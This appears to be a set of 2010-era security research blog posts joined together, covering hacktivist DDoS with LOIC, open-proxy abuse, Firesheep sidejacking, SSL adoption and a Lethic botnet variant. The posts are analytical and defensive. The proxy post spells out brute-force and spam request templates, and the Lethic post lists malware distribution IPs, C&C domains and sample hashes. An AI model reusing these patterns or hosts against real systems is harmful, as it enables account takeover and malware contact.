As I prepare for my annual pilgrimage to the Great White North to visit family, I also turn my attention to the annual tradition of predicting the future. The beauty of the security industry is that it’s never boring. Technologies race forward (often without security) and attackers continue to impress with their ingenuity. 2010 was another fun filled year and 2011 is sure not to disappoint. Enjoy.1.     Political Hacktivism - In the wake of Julian Assange’s arrest, following an already dramatic series of events in the ongoing Wikileaks saga, we gained insight into the power of political hacktivism in the social networked era. Project Payback, the series of Distributed Denial of Service attacks stemming from the movement known as Anonymous, succeeded in temporarily disabling major web sites and did so with limited means and no centralized leadership structure. Anonymous is not a coordinated group, it has no membership list and anyone serving as a spokesperson or leader is likely doing so unilaterally. Project Payback emerged quite literally overnight, encouraged the use of relatively unsophisticated DDoS tools such as Low Orbit Ion Cannon (LOIC) and yet was surprisingly effective. Traditionally, small, well-coordinated groups have been behind efforts related to political hactvism. Now however, we find ourselves in an era where complete strangers can quickly organize, coordinate and attack, and do so with relative anonymity. Welcome to the world of flash mob hactivism. Expect others to be inspired by the attention garnered by Operation Payback and stage similar attacks against corporations or government entities that have received negative press attention.2.     SSL Only Sites - Firesheep opened many eyes to an elephant that has been in the room for many years. While web applications commonly leverage SSL to protect login credentials, most sites shy away from SSL for general traffic once authentication is complete. This is common for a variety of reasons such as performance and complexity, especially when sites tend to be a mashup of content hosted on a variety of different domains. Despite the challenges, Firesheep has forced web application owners to revisit the decision not to make sites SSL only, by brining side jacking to the masses - the ability to capture an authentication cookie and impersonate another user on an open network. With an increasingly mobile workforce accessing web based resources from coffee shops and airports, side jacking attacks are trivial. In 2011, expect a handful of major vendors to finally tackle this challenge head on and deploy SSL only websites.3.     Use and Abuse of the Cloud - In 2010, the Cloud Security Alliance (CSA) released the Top Threats to Cloud Computing. Included on that list of seven threats was the acknowledgement that attackers are drawn to the cloud for the same reasons as legitimate enterprises - low cost access to powerful computing resources. It is not uncommon to see botnet C&C servers or drop zones running on Amazon or Rackspace servers. This may occur due to legitimate hosts being infected or the attackers may purchase the services outright. The on-demand, self service nature of the cloud makes it difficult to prevent abuse up front, leaving cloud vendors to remove abusive accounts once complaints flood the help desk. For attackers that are used to quickly migrating servers as take downs occur, this is hardly a challenge, especially given the ease with which they can quickly spin up dozens of powerful instances at a low price (or free if stolen credit cards are involved). Expect the trend of cloud-hosted botnets to grow.4.     Indirect Data Breaches - 2010 is ending with a series of high profile data breaches including those affecting well known companies such as Gawker Media and McDonald’s (via Silverpop). One thing that we’ve learned from these attacks is that credential theft is not only used to attack the affected domain, but also other sites due to the common practice of sharing the same username/password across numerous sites. Historically, there has been concern that single sign on systems such as Facebook Connect, create an Achilles heel - compromise one database and have access to many. We’re learning that the opposite can be true as well - by forcing people to have multiple logins, they’ll simply repeat one over and over again and their security is then only as strong as the weakest link in that chain - a riskier overall proposition that having one secure authentication source. As media reports of data breaches at popular sites continue, I expect an increasing number of web applications to offer SSO capabilities from well known brands such as Facebook as an option, especially on lesser known sites.5.     Malvertising Goes Offline - Malvertising is a well-known technique, whereby attackers lease advertising space on popular websites in order to facilitate an attack. This may involve targeting a known browser based vulnerability by using the ad to deliver a malicious media file (ie. Flash or images), or it could simply be used to lure unsuspecting users to a secondary, malicious site. To date, malvertising has taken place on websites. However, mobile ad platforms such as iAd (Apple) and AdMob (Google) are emerging as powerful players in an effort to control mobile advertising on tablets and smartphones. Don’t expect attackers to ignore this powerful ability to reach an entirely new set of potential victims. Malvertising could be prevented if advertising networks and host sites better filtered third party content, but history has shown us that often fails to occur.6.     More App Store Abuse - In last year’s security predictions, I spoke about the likelihood that malicious content would make it’s way into mobile app stores. It did take long for that prediction to come true. Now some would argue that even a few malicious apps sneaking past an app store gatekeeper is better than standard process of downloading applications from anywhere on the web where there is little way to know if they’ve ever been scrutinized for security issues. While true, sneaking malicious content into an app store is an attractive prospect for an attacker as they’re able to piggyback on the reputation of the app store host (Apple, Google, RIM, etc.) and potentially infect millions without needing to do anything to generate traffic to the site. In 2011, we’ll see app stores go beyond mobile devices with initiatives such as Google’s Chrome Web Store and Apple’s Mac App Store. Yes, attackers are already salivating at the opportunity to infiltrate another ‘trusted’ app store.7.     Niche Malware - Stuxnet demonstrated that malware can successfully target not just PCs or mobile devices, but any IP connected device, in that particular case, SCADA systems. While, Stuxnet may have had some additional brain power behind the attack, it’s no secret that embedded, Internet connected servers have a spotty security record both due to the lack of scrutiny that they’re subjected to and a generally non-existent patch processes. Earlier this year, I blogged about how embedded web servers have left confidential documents on thousands of HP scanners accessible to anyone with a web browser. Today, anything with a power switch is connected to the Internet. I anticipate the growth of niche malware designed to attack or harvest information from these insecure and often completely unprotected devices.8.     Cloud Shared Technology Breach - Returning to the CSAs Top Threats report, another high risk item making the list relates to vulnerabilities in shared technologies underlying the infrastructure that cloud instances reside upon. For IAAS providers, that includes the hardware, operating system and virtualization technologies. While we move up the stack to include PaaS and SaaS vendors, additional middleware and application components are shared as well. While I don’t necessarily anticipate attacks leveraging a known vulnerability in a COTS component on the infrastructure for a large cloud vendor due to stringent patching practices; I do feel that a high profile breach at a lesser-known vendor, especially one in a custom component of shared technology is quite likely.9.     Social Networking Meets Social Engineering - Attacks on end users virtually always involve social engineering - a user must be convinced to visit a web page, open and attachment, etc. Spam email has valiantly served this purpose for many years, but just as everyday users are migrating away from email and toward social networks such as Facebook and Twitter for communication, so too are hackers. This is far from a bold prediction as attackers have been abusing social networks since they first came online. For example, XSS vulnerabilities on Twitter have been used to push malicious tweets, while likejacking has emerged on Facebook as a means of promoting malicious profiles. While leveraging social networks for evil is not new, I expect 2011 to be the year that social networks become the main communication medium for attackers, not just an alternate channel.10.  Device Agnostic Attacks – As mobile devices continue to gobble up an increasing percentage of bandwidth, attackers will shift to web based, device agnostic attacks. Attacks such as XSS and clickjacking, once seen as academic attacks that were experimented with but not widespread, are now increasingly commonplace. We have witnessed numerous web-based worms, especially on Twitter, thanks to a never-ending battle against XSS vulnerabilities or likejacking - a specific type of clickjacking, targeting Facebook profiles. Why the shift, when there are no shortage of Microsoft vulnerabilities? Whereas the Windows operating system has long dominated the desktop market, the mobile space is an entirely new environment from an attack perspective. Multiple operating systems have significant market share and numerous variants of each exist. As such, operating system vulnerabilities are of less value. Web based attacks however, require nothing more than a Javascript aware web browser – something that every web enabled device from smartphones to television sets now have.See you next year.- michael', 'Data Breach;Hacktivism', 'https://www.zscaler.com/blogs/research/2011-security-predictions');

The latest developments demonstrate just how quickly large, disparate groups can organize and with relatively simple technology do very real damage.\r\n\r\n\r\n\r\n \r\n\r\n\r\nBackground\r\n\r\nFollowing the arrest earlier this week of Julian Assange, the now very public face of Wikileaks, a entity known as Anonymous, has led the charge to encourage DDoS attacks on a variety of websites. Anonymous, which originally emerged from 4chan must be considered an entity as opposed to a group because there is really no concept of membership. Anonymous is simply the banner under which like minded individuals gather in the name of a cause - in this case, to seek retribution for perceived corporate cooperation to cripple Wikileaks, a movement that has come to be known as Operation Payback.\r\n\r\n \r\n\r\nCommunications Infrastructure\r\n\r\nThe group conducting the attacks is open and so are the communication mediums. Coordination has occurred via Twitter, Facebook, the Anonymous website and IRC channels. While various sites have been taken down, new ones emerge to take their place just as quickly. IRC communication has occurred primarily on irc.anonops-irc.com within a variety of channels including #OperationPayback and #Target.\r\n\r\n \r\n\r\nTakedowns are Futile\r\n\r\nVarious sites have been taken down and accounts suspended throughout the wikileaks saga, as corporations are forced to walk the delicate tightrope between free speech and reputational damage. However, in reality such efforts are futile as the modern SaaS/Cloud/Social Internet permits new communication channels to be setup elsewhere almost instantaneously and generally at no cost.\r\n\r\nThe initial Anon_Operation Twitter account was suspended, only to be quickly replaced by others such as Op_Payback and  Anon_SpecOps, which so far remain online. These accounts have served as one of the mechanisms to focus DDoS attacks on specific targets and also share ongoing information about the attacks.\r\n\r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nFacebook also quickly took down a group entitled Operation Payback which supported the effort, only to see dozens more show up in it\'s place.\r\n\r\n\r\nWikileaks itself has setup over 1,000 mirror sites to ensure that individual takedown efforts by ISPs or DNS providers will have a limited effect overall.\r\n \r\n\r\nAttack\r\n\r\nThe DDoS attacks have leveraged a tool known as LOIC (Low Orbit Ion Cannon), a relatively simple tool designed to flood targets with TCP/UDP packets or HTTP headers. Some versions incorporate a \'hive mind\' feature which allows the tool to connect to an IRC channel where the targets can be centrally managed. Throughout the attacks this week, Anonymous has been encouraging anyone willing to participate to use LOIC to flood specific targets. While other tools and attack methods may have been used in the DDoS attacks, LOIC is the one tool that the public at large is being encouraged to adopt. If indeed the successful DDoS attempts have used nothing more than a free Internet fire hose, it is a concerning indicator of overall DDoS defenses at the targeted networks.\r\n\r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nJavascript based versions of LOIC JS have also been preconfigured with attack targets and hosted online. The advantage of this approach is that the tool requires absolutely no security knowledge for someone to participate in the attacks. Rather than needing to compile/install source code, a user simply pulls up LOIC JS in their browser and fires traffic at the target with the click of a button.\r\n\r\n \r\nContributors have even modified versions of LOIC JS for mobile devices to ensure that road warriors can participate in the attacks.\r\n\r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nTargets\r\n\r\nAnonymous has targeted a variety of websites, all of which are perceived to have either caved to government demands to not support Wikileaks or have spoken out against Wikileaks and Julian Assange. \r\n\r\n \r\n\r\nDamage\r\n\r\nDespite the relatively unsophisticated nature of the attacks, they do appear to have been successful in at least temporarily taking sites for Visa, PayPal and Mastercard offline as can be seen in the screenshots below. Reports also indicate that DDoS attacks took down sites for Swiss bank PostFinance, the Swedish Prosecution Authority and Sarah Palin, although an attack on Amazon was unsuccessful.\r\n \r\n\r\n	\r\n		\r\n			 \r\n		\r\n		\r\n			 \r\n		\r\n	\r\n\r\nNetcraft is maintaining a page to monitor uptime of all sites targeted by Operation Payback.\r\n\r\nLessons Learned\r\n\r\nWhile I certainly don\'t condone the Anonymous attacks, it is important that we learn from them. We have seen various instances of hacktivism throughout the years, such as defacements that occurred following the mid-air collision of a US spy plane and a Chinese fighter jet or Project Chanology, an earlier Anonymous effort targeting the Church of Scientology. However, I have not previously seen a movement quite like the one that we are currently witnessing, one where literally thousands of people have come together so quickly, most with limited or no security knowledge and yet they have been able to do real damage. This has occurred in part to the nature of the story itself. It is one that has garnered a global audience, but it has also occurred because the tools to organize such an effort are now so readily available. From social networking sites to free hosting to ubiquitous broadband, the assets required are within reach of anyone with a web browser.\r\n\r\nWhat should corporations and governments take away from this week\'s events?\r\n \r\n\r\n	Hacktivism is a legitimate threat to corporations and governments\r\n	Efforts by authorities to censor communication among hactivists is futile - it will not achieve the intended goal of halting the attacks and will more likely add fuel to the fire\r\n	While attacks may be relatively unsophisticated from a technical perspective, they can be successful nonetheless\r\n\r\n\r\n\r\nThey got the guns, but we got the numbers\r\nGonna win yeah, we\'re taking over.\r\n\"Five to One\", The Doors\r\n\r\n- michael', 'Data Breach;Hacktivism', 'https://www.zscaler.com/blogs/research/hacktivism-display-operation-payback-and-wikilkeaks-saga');

There are various flavors of open proxies:Transparent open proxy - includes originating IP address within the headers or a cookie so the traffic can be traced back to the source (common in a caching proxy setup).Anonymous open proxy - mask/hide the originating IP address of the traffic.  However, there is often a tag from the proxy identifying the proxy version, etc. so that the destination server could identify the traffic as being sent through a proxy.\"Elite\" open proxy - provides no indication to the destination server that the traffic has been forwarded.  These are the most desirable form of proxies in the underground.I\'ve analyzed many thousands of transactions on a few \"elite\" open web proxies, to determine how they are being used (abused).  This is the general breakdown of the percentage of the transactions that I analyzed (there were over a quarter of a million total that I reviewed).#1: Distributed Brute-Forcing:This is the repeated attempt at  trying username / password combinations to gain unauthorized access to  accounts.  Within the abuse of open web proxies, I have seen repeated  abuse of the proxies. For example, proxies are often used to brute-force Yahoo! and Rapidshare  accounts.  As these target sites identify the brute-forcing activity, they block the source IP address from further attempts - so the brute-force attempts are distributed among open proxies to mask and vary the source IP addresses of the attempts.The Yahoo brute-force attempts primarily appear as HTTP GET requests taking a variety of forms:<yahoo>/config/login?login=<username>&passwd=<password><yahoo>/config/pwtoken_get?login=<username>&src=<source>&passwd=<md5_password>&challenge=<challenge_response>&md5=1<yahoo>/client/?.intl=us&.src=knowsrch&.done=http://answers.yahoo.com&login=<username>&passwd=<password><yahoo>/client/clogin?login=<username>&challenge=<challenge>&response=<response>The Rapidshare brute-force attempts appear as HTTP GET requests taking the form:<rapidshare>/cgi-bin/rsapi.cgi?sub=getaccountdetails_v1&type=prem&login=<username>&password=<password><rapidshare>/cgi-bin/premium.cgi&accountid=<id>&password=<password>&premiumlogin=1&logout=&fileid=fileid&fimename=filename&ru=<ru>Note: For both Yahoo and Rapidshare IP addresses and domain names are rotated through.  For example:Log Snippet of Yahoo Brute-Forcing#2: Comment / Forum Spamming:This is the mass-posting of \"comments\" onto blogs, forums, guestbooks, and other sites that allow open interaction with the sites.  These comments include the \"spam advertisement\" variety ranging from porn, pharma, gambling, and pay-per-click affiliates.  The other variety is the SEO variety in which the comments include links back to a page they are trying to increase search engine ranking for.  Some SEO tools like XRumer include this functionality to include automatic registration and CAPTCHA bypass for posting to sites.The comment spam HTTP GETs vary depending on the forum setup, but many followed the formats:<site_page>.php?act=post&do=new_post&f=<forum_id><site_page>.php?do=newthread&f=<forum_id><site_page>.php?mode=post&f=<forum_id>&sid=<session_id><site_page>comment/reply/<story_id>Snippet of logs showing the forum spammingFollowing the spam from one of the forum spammers, shows that they are trying to increase the visibility to World of Warcraft auction sites (e.g., cash for WoW gold).Sample spam message:WoW auction site:#3 Pay-to-click (PTC) \"Cheating\"PTC/PTP/PTR sites are: pay-to-click, pay-to-promote, pay-to read ads / fill out surveys.  These sites are businesses with varying degrees of legitimacy - I doubt the site owners/members pay taxes, in some cases the site owners don\'t pay out their members, and in many cases the members try to \"cheat\" the sites using things like botnets or infected machines.The business model is basic: web site owners and advertisers pay PTC sites to promote their site. In turn, PTC members receive a fraction of a cent for each click they generate to the advertised site.  PTC members also receive commissions for referring new members to sign-up. As such, new members fall into a pyramid hierarchy in which a small percentage of their revenue is given to the referring user.  PTC sites have varying degrees of memberships and also limit the number of times that a member can generate revenue from a participating site.PTC members that try to cheat the system attempt to create as many referred users under them as possible to generate a commission, and from each newly created referrer, automatically click through the participating sites, generating a daily revenue stream something along the following lines:Revenue = ((Commission * Referrer Accounts Created) + (Referrer Accounts Created * Clicks Allowed * Participating Sites * Fraction of a cent payout)) * Number of PTC sites a member ofPTC sites are aware of members attempting to cheat, so they look at things like the source IP of the transactions and identify and ban users when multiple accounts all come from the same IP address.  PTC sites also try to identify if the transactions are being forwarded from a proxy - because of these checks, \"elite\" proxies unknown to the PTC sites are in high demand.Here is an example of a PTC site that I saw being \"cheated\":Note: there are many of these PTC sites, and they all look fairly similar to this setup.On the homepage of the site, top earners are displayed:The number 3 daily earner for this PTC site is \"dominic1102\" - looking at logs, I see this PTC member generating a large number of referrals to make commissions and increase their click volume.  Example format:www.tuxedocatsclicks.info/index.php?ref=dominic1102The \"dominic1102\" handle and client IP (123.134.112.84) was used for a number of other PTC sites as well, e.g., www.lakotaptc.info/index.php?ref=dominic1102Log snippet of PTC cheating#4 IRC / ICQ MaskingUsers of chat networks frequently what to hide their source IP address.  Whether the user is engaged in illegal activity (e.g., selling stolen credentials) or wanting to remain anonymous in case a flame war erupts followed by a denial of service attack.# 5 Proxy Testing / Reveal host IP:It appears that a portion of the traffic analyzed comes from automated checks to identify open proxies.  Once connected, the proxy is tested to see which IP address is exposed on the Internet when traffic is forwarded through the proxy.# 6 Other Browsing and Site ScrapingThis includes a variety of things, ranging from general browsing, porn and other \"not safe for work\" (NSFW) surfing and regular page scraping.

There is currently no way to surf Facebook safely.Unsecure HTTP connectionThere is a worse scenario. I logged out of my account, and went to the secure login page https://www.facebook.com/. I entered the wrong password by accident. I was then redirected to the secure page https://login.facebook.com/login.php. There, I entered my password correctly. But I was redirected to the unsecured http://www.facebook.com/home.php (no HTTPS)!Redirection from secure login page to unsecured home pageAlthough Firesheep has made a lot of noise, and the issue of session side-jacking has now been widely reported on, even the major sites have not taken the necessary actions to protect their users.

Users on open wireless networks are especially at risk when they login to websites without SSL encryption. But not all wireless networks are the same when it comes to sniffing traffic...and wired LAN networks are not 100% safe either.Firesheep found user sessionsWireless networksFiresheep was released to demonstrate the inherent weakness that session hijacking can present on wireless networks. They are several types of wireless networks, some are safe, but most are susceptible to session theft.Open networksOpen wireless networks are becoming more and more popular. They can be found in public libraries, coffee shops, book stores, etc. Anybody can connect to these networks and no password is required. An attacker simply needs to be physically close enough to the wireless signal to steal unencrypted sessions.WEPWEP networks are protected by a password. These networks are often used in hotels to restrict Internet access to paying customers, but the password is the same for everybody. If the attacker knows the password, the network is as unsafe as an open wireless network.It\'s generally very easy for an attacker to get the password without being a real customer (just ask another user for the password and you will likely get it). However, knowledge of the password is not necessarily required, as WEP encryption has been broken. There are tools freely available to crack the password.WPA-PSK/WPA2-PSKUnlike WEP, WPA negotiates a different key with each client to encrypt the traffic, but like WEP, WPA/WPA2 PreShared Key (PSK) encryption has been cracked as well. Somebody with enough security knowledge can determine the shared key, and sniff the HTTP sessions.WPA-Enterprise/WPA2-EnterpriseThese extensions built on the WPA/WPA2 protocols have not been cracked. Unfortunately, those are not often found or personal wireless equipments.Wired networksWired networks are not necessarily safe. As with a wireless network, the type of technology used has an impact on the likelihood that traffic can be intercepted.HubsIf hubs rather than switch are used to connect computers, session sniffing is easy. Hubs send network traffic received on one interface to all other interfaces. This means that anybody connected to the same hub receives everyone else\'s traffic. Hubs are not used in many enterprises because of the security issues they represent, as well as their performance issues. However, they are cheaper that switches, and thus, can still be found in home or SMB networks.Hub: traffic is replicated to all portsSwitchSwitches are more efficient than hubs: the network traffic is forwarded to one interface only. In theory, session sniffing is not possible on these devices. However, it is quite trivial flood a switch in order to make it behave like a hub. This flooding would probably be noticed in a company with a good IT department monitoring the internal network, but not necessarily in smaller companies.Switch: traffic is forwarded to one interface Monitor portMost enterprise-grade network equipment (switches, routers, firewalls) has a monitor or mirror port: all traffic seen by the switch is mirrored to this interface. Anybody with physical access to this port can sniff traffic from the entire network. Unlike the case of flooding a switch to make it behave as a hub, this would not create any unusual network activity, and could not be detected.Don\'t trust your network! Wired LANs are safer than wireless networks in general because they require physical access, but they are not 100% safe. To be sure that you\'re the only one accessing your accounts on the web, make sure you use SSL: use HTTPS only, or use an SSL VPN.-- Julien', 'Encryption;Data Breach', 'https://www.zscaler.com/blogs/research/which-networks-are-more-susceptible-firesheep-aka-session-sniffing');

Indeed, encryption is the only way to ensure that user sessions cannot be easily sniffed on a open wireless network.\r\n\r\nThis sounds easy - just add an s after http in the URL! It\'s not actually that easy. Here are some of the challenges.\r\n\r\nServer overhead\r\n\r\nThe obvious issue is that encrypting all HTTP sessions requires additional resources on the sever-side. I\'ve seen numbers showing 10% to 20% CPU overhead for SSL. Having to add 10% more servers is a big deal when you\'re dealing with thousands of them like Facebook and Google. However, the overhead can actually be much higher on specialized severs, which efficiently serve static content (such as images) directly from memory (think memcached). In this case, the processing power required is easily multiplied by a factor of 10. Of course the SSL encryption can be offloaded to a proxy or other external hardware, but you have to add the cost of managing a more complex topology as well as buying the new hardware.\r\n\r\nIncreased latency\r\n\r\nSSL also has a perceived performance issue for the client (i.e. the browser). For  each new session,  SSL encryption must be set up between the client and server. This means a few more packets must be sent back and force before the actual HTTP data is received. This happens for each page load, and also for each domain.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			1 HTTPS transaction: 4 SSL handshake packets, 6 data apckets\r\n		\r\n	\r\n\r\n\r\n\r\nA typical  Facebook page (like the News Feed) contains HTML elements (images, CSS, JavaScript) from more than 10 domains.  This means the full SSL handshake is done over 10 times on each page. This in turn makes pages load more slowly. The problem is amplified if the user\'s connection has high latency, as it would on a cell phone.\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			4 of the 10+ domains used on a Facebook page\r\n		\r\n	\r\n\r\n\r\n\r\nChallenge for CDNs\r\n\r\nAll the major websites use a Content Delivery Network (CDN) to deliver static content quickly to their users. Some have their own (Facebook, Google), but others use third parties such as Akamai.\r\n\r\nThe same website can be served from hundreds of CDN servers based on their geographical location, and each CDN server can handle several hundred websites. Most website owners don\'t want users to see content being downloaded from akamai.com, so they use an alias. For example, static.amd.com could point to a248.e.akamai.net.\r\n\r\nEach CDN therefore serves different content based on the Host header received (static.amd.com for example). This creates a problem. The SSL handshake is done first,  then the HTTP data is sent. That means the SSL server must send an SSL certificate to each client without first seeing the host. In brief, the SSL server sends a certificate based on the destination IP address, not based on the HTTP hostname.\r\n\r\nThe second fact to keep in mind is that an SSL certificate is valid for one domain only.  If a user goes to www.example.com, the certificate has to be signed for www.example.com, not example.com or example.net.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			SSL certificate for www.facebook.com\r\n		\r\n	\r\n\r\n\r\n\r\nFor example, http://www.amd.com/ is served entirely through Akamai. So what happens when you use https://www.amd.com/ ? You get a warning, because the Akamai CDN server sends a certificate valid for itself (a248.e.akamai.net), not for www.amd.com.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Wrong SSL certificate issued for akamai.net instead of amd.com\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nWildcard certificates are not enough \r\n\r\nYou don\'t need to use a CDN to have troubles serving the right certificate for a given hostname. Most sites can be reached with and without www: http://amazon.com/ and http://www.amazon.com/ brings you to the same site. When a site wants to handle several sub-domains (www.site.com, mail.site.com, static.site.com, etc.) easily, it can buy a wildcard certificate. This certificate is valid not just for one domain, but for all sub-domains: *.site.com. Unfortunately, this wildcard certificate is not valid for site.com (no sub-domain). For that, a separate certificate is required. This is again a challenge if the same IP address servers both site.com and www.site.com.\r\n\r\nDropbox has this exact issue. Access to https://dropbox.com/ delivers a warning to he user:\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Dropbox\'s wildcard SSL certificate is not valid for dropbox.com\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nMixed HTTP/HTTPS: the chicken & the egg problem\r\n\r\nYet another issue - HTTPS pages must contain external object from HTTPS URLs only. You cannot match HTTP and HTTPS on a secure page, otherwise users receive a warning message. Websites however rely on a significant amount of content from external sites: Googole/Comscore Analytics, Google/Twitter/Facebook connect, ads, etc.\r\n\r\nGoogle Adsense, for example, cannot be used on a secure site. All sites which rely on this advertising network to make some money need to forget about HTTPS and about protecting their users!\r\n\r\nEach website needs to make sure that all their partners, sometimes much bigger than they are, fully support HTTPS before they switch to it.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Warning about external HTTP objects on a secure page\r\n		\r\n	\r\n\r\n\r\n\r\nWarning are scary!\r\n\r\nIt is not easy for a site to switch to SSL for all content. One mistake, and users will receive a warning. And they\'re scary! Internet Explorer 8 explicitly suggests that the user not to enter a site with an SSL certificate error.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Scary warning on Internet Explorer\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\nWebsites really don\'t want to scare away potential visitors!\r\n\r\nBut it is possible\r\n\r\nMoving from HTTP to HTTPS is easier said than done. This must be carefully planned. All cases have to be thought through to avoid warning messages. Despite that fact, all of the challenges discussed in this post do have technical sotuions.\r\n\r\nThis can be done. Google has already moved Gmail to HTTPS by default, but they have not done the same for their other services.', 'Data Breach;Encryption;Microsoft', 'https://www.zscaler.com/blogs/research/why-web-has-not-switched-ssl-only-yet');

Chances are you do- a few months back there was a worm that spread over USB using the 0-day .LNK vulnerability (CVE-2010-2568) and targeted Siemens SCADA systems. Additionally the rootkit package that it installed was digitally signed using real certificates from real hardware manufacturers: Realtek Semiconductor Corp. (www.realtek.com.tw) was one of the companies (JMicron was the other - both are Taiwanese companies).    In recent days, I have seen malware with Realtek Semiconductor Corp. signature information. Specifically, it has been of the Trojan Lethic / Ddox malware family. About a year ago, Jose Nazario detailed his analysis on the Lethic bot being used to spew pharma, replica, etc. spam. About a month after he posted his analysis, M86 reported on the Lethic botnet takedown. Well it appears that there is a new variant / botnet of this malware family:    Here are two recent samples:    MD5: 0460d89f0091d951184a8d77c6641340  First seen: 2010-10-31 17:42:29  VirusTotal Report    MD5: ddb7aee9b335f479e0e2ac7aaf223856  First seen: 2010-11-07 09:58:39  VirusTotal Report    Both have Realtek information reported from Microsoft\'s Sigcheck tool:  However, the tool shows no signer / certificate authority verified the signature. Here is a snapshot of the Stuxnet signcheck output for comparison:  Stuxnet and Lethic are completely different, and I am in no way presuming that one or more authors behind either malware campaign intersect - I did think it was interesting that this one company is being \"picked\" in malware campaigns though.    There may be some correlation with the exact Realtek information in the Lethic binary. The information within the Lethic binary does appear to mimic valid Realtek information for their AC97 Audio product. Doing some searches, I\'ve found other malware families have used this exact Realtek information within their malware binaries. Here is a VirusTotal report from an SDBot sample first seen in January 2010, that has the exact same Realtek information used by Lethic. Separate malware authors could have simply selected a legitimate software package and included the exact information - however this does seem pretty coincidental. Or perhaps it could be the \"signature\" of a common author or group behind these artifacts - perhaps they seek to tarnish the reputation of this Taiwanese company for personal or political motivation - who knows?    There are about 91 Lethic samples with the \"Realtek\" signature information that Google shows from VirusTotal. These date from early September to present.    In the past few days, locations that I\'ve seen the Lethic bot spread from include:  77.79.9.174 over port 17678  85.17.58.165 over port 36182  91.121.175.219 over port 16512    The port location changes over time, and rotates through funky sounding executable names that appear to be auto-generated from various letter permutations. For example:  bknx.exe  fewfdewwe.exe  fefewwew.exe  rfvmimikwe.exe  vgewfwqwq.exe  vgrwvew.exe    Following infection, connection attempts have been seen to:  izuhjsn.com (173.236.56.218) on port 8706  xkihjhx.com (67.159.45.104) on port 2904    The domains were both registered August 1, 2010 through the Registrars:  BEIJING INNOVATIVE LINKAGE TECHNOLOGY LTD.

In mid-October, an Anubis report shows a \"Realtek\" Lethic sample looping through a number of SMTP proxies/open-relays and sending spam similar to the pharma, replicas, etc. that Jose had reported in the previous 2009 iteration of the botnet. Here is a pcap snapshot of a replica spam message sent from the recent, Fall 2010 iteration of the Lethic bot:      El Reg recently reported on how prolific the Lethic botnet was and the success of the takedown... could it be ramping up to make a come back? Also, can this \"Realtek\" signature info be used to tie the author/group to the malware they have released?    Update:  The Sigcheck tool apparently parses the PE File Version Info data structure and includes this in the output. The above \"Realtek\" information is actually extracted from the PE File Version Info data structure (e.g., here).

BlackSheep works on Windows (XP or higher) and MacOSX (10.5 or higher, Intel processor only), and Firefox 3.5 to 3.6.12.The main reason for these restrictions is that BlackSheep, like Firesheep, contains executables to listen for HTTP traffic. These executables must be compiled for each platform they run on. BlackSheep\'s executables come straight from the Firesheep code.However, I am working on extending the platform that can run our plugin. Here are the 2 platforms which should be supported soon:Firefox 4.0 BetaIn theory, BlackSheep should work on Firefox 4.0. However, I don\'t have the latest beta installed for testing. If Firefox beta users are ready to test the plugin, I can send them a special package. if enough readers test the plugin successfully on Firefox 4.0 Beta, I will make the official version available for 4.0 Please e-mail me to jsobrier@zscaler.com if you have some time for testing.LinuxSupport for Linux is quite a challenge. As mentioned before, the main problem is that there should be a different version for each Linux distribution out there because of the dependencies on multiple libraries.But support for Linux was number one request I got in the mail today, so I have spend some time on it. Support for Linux should be available on Wednesday. I\'ll announce it on this blog. Be aware that this will involve some work form the Linux users to get BlackSheep running in their environment.Javascript error in the preferences menuJavaScript error in the Preferences menu\"ReferenceError: Cc is not defined\". This problem happens mainly for Windows users. Make sure you have Winpcap installed. If not, install it and restart your browser.Apparently, this also happen for a few Mac users. The main reason is that the back-end is not able to retrieve the list of network interfaces. However, the plugin would most likely work if the interface were to be hard-coded in case of failure. I\'m working on a fix for this.MacOSX and FileVaultIf you use FileVault on MacOSX, you might be prompted for a password to run firesheep-backend. See this thread for more information.

See this thread for more information.    You\'ve probably all heard of Firesheep by now, a Firefox add-on which lets anyone hijack a user\'s session to various popular web applications when they\'re using an open wireless network. While sniffing/stealing session credentials is nothing new, Firesheep exposes this capability to the masses by automating the process so that absolutely no technical know-how is required. Unfortunately, it is actually quite difficult to defend against Firesheep because most sites only permit SSL connections during the initial login, not while surfing other pages. As such, while your username and password are encrypted, your session ID is available to all other machines on the same network.    In a previous post, Mike showed how to detect the use of Firesheep on a local network by using Wireshark and Scapy. Well, today, we\'re releasing a new Firefox add-on which makes the detection of FireSheep available to everyone and we\'re calling it BlackSheep!                	  		  			  		  		  			BlackSheep installed  		  	        BlackSheep is a Firefox add-on which warns users if someone is using Firesheep on their network. It also indicates the IP address of the machine that is spying on you.                          	  		  			  		  		  			BlackSheep warns that someone is using FireSheep  		  	                           How BlackSheep works    To understand how BlackSheep works, we first need to understand the details of FireSheep. FireSheep listens to the HTTP traffic on port 80. When it identifies a transaction to a known site (Facebook, Google, Yahoo!, etc.), it looks for specific cookie values which are then used to identify a specific user. This phase of the attack cannot be detected as it is done passively.    When FireSheep identifies a user session, it then makes a request to the same site using the user\'s cookie values in order to retrieve user information such as their name, picture, etc. This active network activity is however visible to others on the local network.    BlackSheep detects the active connection made by Firesheep. It does this by making HTTP requests to random sites handled by FireSheep every 5 minutes (configurable) with fake values. BlackSheep then listens to all HTTP requests on the network to detect if somebody else is using the same fake values.    Use Firesheep to combat.... Firesheep!    BlackSheep is based on the FireSheep source code. It 